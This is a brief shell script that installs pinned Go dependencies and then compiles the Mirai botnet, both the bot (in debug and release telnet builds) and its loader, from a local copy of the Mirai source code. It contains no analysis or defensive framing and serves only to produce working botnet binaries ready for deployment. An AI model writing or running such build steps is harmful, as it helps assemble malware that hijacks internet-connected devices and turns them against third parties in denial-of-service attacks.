go get github.com/go-sql-driver/mysql
cd $GOPATH/src/github.com/go-sql-driver/mysql
git checkout v1.3.0

go get github.com/mattn/go-shellwords
cd $GOPATH/src/github.com/mattn/go-shellwords
git checkout v1.0.1
clear

cd ~/Mirai-Source-Code/mirai
./build.sh debug telnet && echo "MIRAI COMPILED ON DEBUG MODE" || echo "ERROR COMPILING MIRAI IN DEBUG MODE"
./build.sh release telnet && echo "MIRAI COMPILED" || echo "ERROR COMPILING MIRAI"

cd ~/Mirai-Source-Code/loader
./build.sh && echo "LOADER COMPILED" || echo "ERROR COMPILING LOADER"

# Vitor Silva Reis